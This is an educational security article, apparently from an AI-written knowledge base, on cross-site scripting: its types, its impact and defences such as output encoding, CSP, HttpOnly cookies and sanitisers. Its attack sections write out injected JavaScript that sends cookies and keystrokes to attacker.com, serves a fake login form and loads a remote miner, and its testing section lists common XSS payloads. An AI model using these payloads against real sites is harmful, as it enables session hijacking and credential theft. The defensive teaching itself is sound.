---
title: Cross-Site Scripting (XSS)
chapter: security
type: vulnerability
difficulty: intermediate
prerequisites:
  - "[[HTML Basics]]"
  - "[[JavaScript Basics]]"
  - "[[Input Validation]]"
related:
  - "[[SQL Injection]]"
  - "[[Content Security Policy]]"
  - "[[Cross-Site Request Forgery]]"
tags:
  - security
  - vulnerabilities
  - owasp-top-10
  - web-security
  - injection
status: published
created: "2026-03-05"
updated: "2026-03-05"
author: Almanac Bot
---

# Cross-Site Scripting (XSS)

## Overview

Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious JavaScript into web pages viewed by other users. When successful, XSS enables attackers to steal session cookies, redirect users to phishing sites, deface websites, or perform actions on behalf of victims.

Think of it like putting a note with malicious instructions in a public bulletin board. When someone reads the note, they unknowingly follow the instructions, thinking they came from a trusted source (the website).

## Core Concept

XSS exploits the browser's trust in content from a website. **If an application includes user-provided data in web pages without proper sanitization or encoding, attackers can inject executable code.**

The browser can't distinguish between legitimate JavaScript from the website and malicious JavaScript injected by an attacker—it executes both.

**The vulnerability pattern**:
```html
<!-- VULNERABLE - Never do this -->
<p>Welcome back, <?php echo $_GET['name']; ?></p>
```

If an attacker provides `name=<script>alert('XSS')</script>`, the page becomes:
```html
<p>Welcome back, <script>alert('XSS')</script></p>
```

The malicious script executes in the victim's browser with full access to the page and session.

## Types of XSS

### Reflected XSS (Non-Persistent)

Malicious script comes from the current HTTP request and is immediately reflected back in the response.

**Example**: Search functionality
```
https://example.com/search?q=<script>/* malicious code */</script>
```

The vulnerable page displays:
```html
<p>Search results for: <script>/* malicious code */</script></p>
```

**Attack vector**: Attacker sends victim a crafted link via email or social media.

### Stored XSS (Persistent)

Malicious script is stored in the database and displayed to all users who view the affected page.

**Example**: Comment section
```html
<!-- Attacker submits this as a comment -->
Great article! <script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

Every user viewing the comments page executes the malicious script.

**More dangerous**: Affects multiple users without requiring them to click a malicious link.

### DOM-Based XSS

Vulnerability exists in client-side JavaScript that improperly handles user input.

**Example**: URL hash parsing
```javascript
// VULNERABLE - Never do this
const userInput = window.location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;
```

**Attack URL**: `https://example.com/#<img src=x onerror=alert('XSS')>`

The page's own JavaScript inserts the malicious payload into the DOM.

## Attack Examples

### Session Cookie Theft

```javascript
// Injected script sends cookies to attacker
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ cookies: document.cookie })
});
```

Attacker gains access to the victim's session, allowing account takeover.

### Keylogging

```javascript
// Injected script captures keystrokes
document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log', {
        method: 'POST',
        body: e.key
    });
});
```

### Phishing

```javascript
// Injected script creates fake login form
document.body.innerHTML = `
    <div style="position:absolute;top:0;left:0;width:100%;background:white">
        <h2>Session Expired - Please Login</h2>
        <form action="https://attacker.com/phish">
            <input name="username" placeholder="Username">
            <input name="password" type="password" placeholder="Password">
            <button>Login</button>
        </form>
    </div>
`;
```

### Cryptocurrency Mining

```javascript
// Injected script runs cryptominer in victim's browser
const script = document.createElement('script');
script.src = 'https://attacker.com/miner.js';
document.head.appendChild(script);
```

## Defense Mechanisms

### 1. Output Encoding (Context-Aware Escaping)

**The primary defense**. Encode data based on where it appears in the HTML document.

**HTML Context**:
```python
import html

# SECURE - Encode for HTML
safe_output = html.escape(user_input)
# <script>alert('XSS')</script> becomes:
# &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
```

**JavaScript Context**:
```javascript
// SECURE - JSON encoding for JavaScript
const safeData = JSON.stringify(userData);
const script = `<script>var data = ${safeData};</script>`;
```

**URL Context**:
```python
from urllib.parse import quote

# SECURE - URL encoding
safe_url = f"/search?q={quote(user_query)}"
```

**CSS Context**:
```python
# SECURE - Whitelist allowed values, escape others
def safe_color(color):
    if re.match(r'^#[0-9A-Fa-f]{6}$', color):
        return color
    return '#000000'  # Default to black
```

### 2. Content Security Policy (CSP)

HTTP header that restricts what resources the browser can load.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
```

**What it does**:
- Blocks inline scripts (`<script>` tags in HTML)
- Blocks `eval()` and similar dynamic code execution
- Restricts script sources to whitelisted domains

**Example secure header**:
```python
# Flask example
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' https://cdn.example.com; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "object-src 'none'"
    )
    return response
```

### 3. Input Validation

Validate input format and reject unexpected patterns:

```python
import re

def validate_username(username):
    # Only allow alphanumeric, underscore, hyphen
    if not re.match(r'^[a-zA-Z0-9_-]{3,20}$', username):
        raise ValueError("Invalid username")
    return username
```

**Important**: Validation is defense-in-depth, not a replacement for output encoding.

### 4. Template Auto-Escaping

Modern frameworks auto-escape by default:

**Jinja2 (Python)**:
```html
<!-- SECURE - Auto-escaped -->
<p>Welcome, {{ username }}</p>
```

**React (JavaScript)**:
```jsx
// SECURE - Auto-escaped
<p>Welcome, {username}</p>
```

**Django (Python)**:
```html
<!-- SECURE - Auto-escaped -->
<p>Welcome, {{ username }}</p>
```

**Warning**: Be careful with "raw" or "safe" filters that disable escaping:
```html
<!-- DANGEROUS - Bypasses auto-escaping -->
<p>{{ user_html|safe }}</p>
```

### 5. HTTPOnly and Secure Cookies

Prevent JavaScript access to session cookies:

```python
# Set HTTPOnly flag on cookies
response.set_cookie(
    'session_id',
    value=session_id,
    httponly=True,  # JavaScript can't access
    secure=True,    # Only sent over HTTPS
    samesite='Strict'  # CSRF protection
)
```

Even if XSS occurs, attackers can't steal the session cookie.

### 6. Sanitization Libraries

For rich text input (forums, comments with formatting):

**Python (Bleach)**:
```python
import bleach

# SECURE - Whitelist allowed tags
safe_html = bleach.clean(
    user_html,
    tags=['p', 'br', 'strong', 'em', 'a'],
    attributes={'a': ['href', 'title']},
    protocols=['http', 'https', 'mailto']
)
```

**JavaScript (DOMPurify)**:
```javascript
// SECURE - Sanitize before inserting
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

## Detection and Prevention

### Code Review Checklist

- [ ] All user input is output-encoded based on context
- [ ] Template auto-escaping is enabled
- [ ] Content Security Policy header is set
- [ ] Cookies have HTTPOnly and Secure flags
- [ ] No use of `innerHTML`, `eval()`, or `document.write()` with user data
- [ ] Rich text input uses sanitization libraries
- [ ] JavaScript frameworks (React, Vue, Angular) used correctly

### Testing for XSS

**Common payloads**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<input onfocus=alert('XSS') autofocus>
```

**Automated scanning**:
- OWASP ZAP
- Burp Suite
- XSStrike
- Browser extensions (XSS Scanner)

### Browser Developer Tools

Check CSP violations in browser console:
```
Refused to execute inline script because it violates the following
Content Security Policy directive: "script-src 'self'"
```

## Common Pitfalls

**Encoding once isn't enough**: Different contexts require different encoding. Don't just HTML-encode everything.

**Client-side validation only**: Attackers can bypass client-side checks. Always validate and encode server-side.

**Blacklist filtering**: Trying to block `<script>` tags is insufficient. Attackers have hundreds of bypass techniques. Use whitelist validation and context-aware encoding.

**Trusting "sanitized" data from database**: Data stored in the database might have been sanitized on write, but always encode on read based on output context.

## Real-World Impact

**Notable incidents**:
- **Twitter (2010)**: Stored XSS worm spread to 250,000+ users
- **British Airways (2018)**: XSS on payment page led to 380,000 compromised cards
- **MySpace Samy Worm (2005)**: XSS worm gained 1 million friends in 20 hours

**Typical damages**:
- Account takeover via session theft
- Malware distribution
- Phishing attacks
- Website defacement
- Data exfiltration
- Reputation damage

## Security Considerations

**Do**:
- Encode output based on context (HTML, JavaScript, URL, CSS)
- Use template auto-escaping
- Implement Content Security Policy headers
- Set HTTPOnly and Secure flags on sensitive cookies
- Validate input format
- Use sanitization libraries for rich text
- Keep frameworks and libraries updated

**Don't**:
- Insert user input into HTML without encoding
- Use `innerHTML`, `eval()`, or `document.write()` with user data
- Disable auto-escaping without strong justification
- Rely solely on client-side validation
- Trust data just because it's from your database
- Use blacklist filtering

## See Also

- [[Content Security Policy]]
- [[Input Validation]]
- [[SQL Injection]]
- [[Cross-Site Request Forgery]]
- [[OWASP Top 10]]

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [Content Security Policy Level 3 (W3C)](https://www.w3.org/TR/CSP3/)
- [DOMPurify - XSS Sanitizer](https://github.com/cure53/DOMPurify)
- "The Tangled Web: A Guide to Securing Modern Web Applications" (Michal Zalewski)
